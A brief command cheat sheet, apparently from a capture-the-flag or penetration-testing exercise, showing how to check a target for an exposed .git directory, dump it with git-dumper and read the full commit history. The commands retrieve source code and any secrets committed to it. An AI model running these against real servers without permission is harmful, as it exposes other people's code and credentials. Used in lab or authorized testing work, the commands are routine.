# Quick Commands Reference

## Check if .git is exposed
curl -i http://TARGET_IP:8080/.git/HEAD

## Dump the repository
git-dumper http://TARGET_IP:8080/.git/ ./bytelotus

## Check full commit history
cd bytelotus
git log --all -p | less
